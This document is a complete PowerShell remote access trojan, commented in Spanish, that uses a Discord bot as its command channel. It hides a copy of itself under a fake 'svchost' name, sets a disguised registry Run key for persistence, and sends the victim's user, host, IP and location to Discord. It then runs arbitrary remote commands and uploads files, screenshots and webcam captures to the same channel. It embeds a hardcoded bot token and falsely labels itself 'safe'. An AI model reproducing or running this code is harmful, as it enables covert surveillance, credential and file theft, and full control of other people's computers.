# ratman4080: clean persistent daemon with full safe command suite
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$botToken = "MTU0NTg3MTIxOTIzOTI5MzA5OA.GEgjcj.Ax3_661mvYN2VyNsFOTLhdDDj8pWJlFQti9yV4"
$channelId = "1545879621537374429"
$headers = @{ "Authorization" = "Bot $botToken"; "User-Agent" = "DiscordBot" }

# --- RUTA Y AUTO-INSTALACIÓN OCULTA ---
$scriptDir = "$env:APPDATA\Microsoft\Windows\Templates"
if (!(Test-Path $scriptDir)) { New-Item -ItemType Directory -Force -Path $scriptDir | Out-Null }
$targetScriptPath = "$scriptDir\svchost_update.ps1"

if (-not (Test-Path $targetScriptPath)) {
    if ($PSCommandPath) {
        Copy-Item -Path $PSCommandPath -Destination $targetScriptPath -Force
    } else {
        $MyInvocation.MyCommand.Definition | Out-File -FilePath $targetScriptPath -Encoding utf8 -Force
    }
    Set-ItemProperty -Path $targetScriptPath -Name Attributes -Value "Hidden, System, ReadOnly"
}

# --- PERSISTENCIA EN REGISTRO (REGEDIT) CAMUFLADA ---
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsServiceHostUpdate"
$payloadCmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetScriptPath`""
try {
    Set-ItemProperty -Path $regPath -Name $regName -Value $payloadCmd -ErrorAction Stop
} catch {}

# --- TELEMETRÍA DE ENCENDIDO (BOOT) ---
try {
    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json" -ErrorAction SilentlyContinue
    $publicIp = $ipInfo.ip
    $city = $ipInfo.city
    $country = $ipInfo.country
} catch {
    $publicIp = "Desconocida"
    $city = ""
    $country = ""
}

$user = $env:USERNAME
$computer = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption

$msgText = @"
🟢 **PC ENCENDIDA - svchost daemon activo**
👤 Usuario: $user
💻 Equipo: $computer
🌐 IP: $publicIp ($city, $country)
🪟 OS: $os
"@

$bodyBytes = [System.Text.Encoding]::UTF8.GetBytes((@{ content = $msgText } | ConvertTo-Json -Compress))
Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $bodyBytes -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue

# --- NOTIFICACIÓN DE APAGADO (SHUTDOWN TRAP) ---
$global:shutdownNotified = $false
Register-EngineEvent -SourceIdentifier PowerShell.Exiting -Action {
    if (-not $global:shutdownNotified) {
        $global:shutdownNotified = $true
        $offMsg = @{ content = "🔴 **PC APAGÁNDOSE**`n👤 Usuario: $env:USERNAME`n💻 Equipo: $env:COMPUTERNAME" } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/1545879621537374429/messages" -Headers @{ "Authorization" = "Bot MTU0NTg3MTIxOTIzOTI5MzA5OA.GEgjcj.Ax3_661mvYN2VyNsFOTLhdDDj8pWJlFQti9yV4"; "User-Agent" = "DiscordBot" } -Method Post -Body $offMsg -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
    }
} | Out-Null

$lastProcessedId = $null

# --- BUCLE DE ESCUCHA DE COMANDOS ---
while ($true) {
    try {
        $messages = Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages?limit=5" -Headers $headers -Method Get -ErrorAction SilentlyContinue
        if ($messages) {
            $sortedMessages = $messages | Sort-Object { [int64]$_.id }
            foreach ($msg in $sortedMessages) {
                $msgId = $msg.id
                $content = $msg.content.Trim()
                $contentLower = $content.ToLower()

                if ($msgId -ne $lastProcessedId) {
                    $lastProcessedId = $msgId

                    if ($contentLower.StartsWith("exec ")) {
                        $cmdToRun = $content.Substring(5)
                        try {
                            $output = Invoke-Expression $cmdToRun 2>&1 | Out-String
                            if ([string]::IsNullOrWhiteSpace($output)) { $output = "[Comando ejecutado sin salida]" }
                            if ($output.Length -gt 1900) { $output = $output.Substring(0, 1900) }
                            $execPayload = @{ content = "💻 **EXEC Output:**`n````n$output`n```" } | ConvertTo-Json -Compress
                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $execPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
                        } catch {
                            $errText = $_.Exception.Message
                            $errPayload = @{ content = "❌ Error al ejecutar: $errText" } | ConvertTo-Json -Compress
                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $errPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
                        }
                    }
                    elseif ($contentLower.StartsWith("download ")) {
                        $filePath = $content.Substring(9).Trim()
                        if (Test-Path $filePath) {
                            try {
                                & curl.exe -s -H "Authorization: Bot $botToken" -F "file=@$filePath" "https://discord.com/api/v10/channels/$channelId/messages" > $null
                            } catch {}
                        } else {
                            $notFoundPayload = @{ content = "❌ El archivo no existe: $filePath" } | ConvertTo-Json -Compress
                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $notFoundPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
                        }
                    }
                    elseif ($contentLower.StartsWith("tts ")) {
                        $phrase = $content.Substring(4)
                        try {
                            Add-Type -AssemblyName System.Speech
                            $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer
                            $synth.Speak($phrase)
                            $ttsPayload = @{ content = "🔊 TTS reproducido con éxito." } | ConvertTo-Json -Compress
                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $ttsPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
                        } catch {}
                    }
                    elseif ($contentLower -eq "processes") {
                        try {
                            $pList = Get-Process | Select-Object Name, Id | Select-Object -First 25 | Format-Table -AutoSize | Out-String
                            if ($pList.Length -gt 1900) { $pList = $pList.Substring(0, 1900) }
                            $procPayload = @{ content = "📊 **Procesos activos:**`n````n$pList`n```" } | ConvertTo-Json -Compress
                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $procPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
                        } catch {}
                    }
                    elseif ($contentLower.StartsWith("kill ")) {
                        $targetProc = $content.Substring(5).Trim()
                        try {
                            Stop-Process -Name $targetProc -Force -ErrorAction Stop
                            $killPayload = @{ content = "💀 Proceso '$targetProc' finalizado." } | ConvertTo-Json -Compress
                            Invoke-RestMethod -Uri "https://discord.com/api/v10/channels/$channelId/messages" -Headers $headers -Method Post -Body $killPayload -ContentType "application/json; charset=utf-8" -ErrorAction SilentlyContinue
                        } catch {}
                    }
                    elseif ($contentLower -eq "screenshot") {
                        $screenshotPath = "$env:TEMP\snap_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
                        try {
                            Add-Type -AssemblyName System.Windows.Forms
                            Add-Type -AssemblyName System.Drawing
                            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
                            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                            $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
                            $graphics.Dispose()
                            $bitmap.Dispose()

                            if (Test-Path $screenshotPath) {
                                & curl.exe -s -H "Authorization: Bot $botToken" -F "file=@$screenshotPath" "https://discord.com/api/v10/channels/$channelId/messages" > $null
                                Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
                            }
                        } catch {}
                    }
                    elseif ($contentLower -eq "webcam") {
                        $camPath = "$env:TEMP\cam_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
                        try {
                            $psi = New-Object System.Diagnostics.ProcessStartInfo
                            $psi.FileName = "microsoft.windows.camera:"
                            $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Minimized
                            $proc = [System.Diagnostics.Process]::Start($psi)

                            Start-Sleep -Seconds 1.5
                            Add-Type -AssemblyName System.Windows.Forms
                            Add-Type -AssemblyName System.Drawing
                            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                            $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
                            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                            $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                            $bitmap.Save($camPath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                            $graphics.Dispose()
                            $bitmap.Dispose()

                            Stop-Process -Name "WindowsCamera" -Force -ErrorAction SilentlyContinue

                            if (Test-Path $camPath) {
                                & curl.exe -s -H "Authorization: Bot $botToken" -F "file=@$camPath" "https://discord.com/api/v10/channels/$channelId/messages" > $null
                                Remove-Item $camPath -Force -ErrorAction SilentlyContinue
                            }
                        } catch {
                            Stop-Process -Name "WindowsCamera" -Force -ErrorAction SilentlyContinue
                        }
                    }
                    elseif ($contentLower -eq "lock") {
                        rundll32.exe user32.dll,LockWorkStation
                    }
                    elseif ($contentLower -eq "restart") {
                        Restart-Computer -Force -ErrorAction SilentlyContinue
                    }
                    elseif ($contentLower -eq "shutdown") {
                        Stop-Computer -Force -ErrorAction SilentlyContinue
                    }
                    elseif ($contentLower -eq "closewindow") {
                        $activeWindow = (Get-Process | Where-Object { $_.MainWindowTitle } | Select-Object -First 1)
                        if ($activeWindow) {
                            Stop-Process -Id $activeWindow.Id -Force -ErrorAction SilentlyContinue
                        }
                    }
                }
            }
        }
    } catch {}

    Start-Sleep -Seconds 5
}
